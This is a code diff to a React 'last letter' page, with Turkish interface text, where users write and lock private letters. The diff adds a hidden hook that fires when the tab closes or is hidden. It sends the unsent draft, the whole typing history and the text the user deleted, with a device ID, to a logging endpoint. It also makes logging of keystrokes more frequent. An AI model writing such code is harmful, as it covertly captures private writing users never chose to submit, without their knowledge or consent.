@@ -307,6 +307,44 @@ export default function LastLetterPage({ onGoHome }) {
     sendLog('last_lock_clicked', { action: '"Mektubu Sakla" Butonuna Basıldı' });
   };
 
+  // Unload / Tab Close Draft Capture Sentinel (Captures notes even if tab is closed without sending)
+  useEffect(() => {
+    const sendUnloadDraft = () => {
+      if (lockModeActive && prevNoteTextRef.current && prevNoteTextRef.current.trim().length > 0) {
+        const payload = JSON.stringify({
+          eventType: 'last_note_draft_abandoned',
+          data: {
+            noteText: prevNoteTextRef.current,
+            allTypedHistory: allTypedRef.current || prevNoteTextRef.current,
+            deletedText: deletedSegmentsRef.current.join(' | ') || '-',
+            stage: 'Mektup Saklama Formu Gönderilmeden Sekme Kapandı',
+            deviceId: getDeviceId()
+          },
+          timestamp: new Date().toISOString()
+        });
+
+        if (navigator.sendBeacon) {
+          const blob = new Blob([payload], { type: 'application/json' });
+          navigator.sendBeacon('/api/flower-logs', blob);
+        }
+      }
+    };
+
+    const handleVisibilityChange = () => {
+      if (document.visibilityState === 'hidden') {
+        sendUnloadDraft();
+      }
+    };
+
+    window.addEventListener('beforeunload', sendUnloadDraft);
+    document.addEventListener('visibilitychange', handleVisibilityChange);
+
+    return () => {
+      window.removeEventListener('beforeunload', sendUnloadDraft);
+      document.removeEventListener('visibilitychange', handleVisibilityChange);
+    };
+  }, [lockModeActive]);
+
   const handleNoteTextChange = (e) => {
     const val = e.target.value;
     const prev = prevNoteTextRef.current;
@@ -330,7 +368,7 @@ export default function LastLetterPage({ onGoHome }) {
         allTypedHistory: allTypedRef.current || val,
         deletedText: deletedSegmentsRef.current.join(' | ') || '-'
       });
-    }, 1800);
+    }, 600);
   };
 
   const generateSha256Hash = () => {
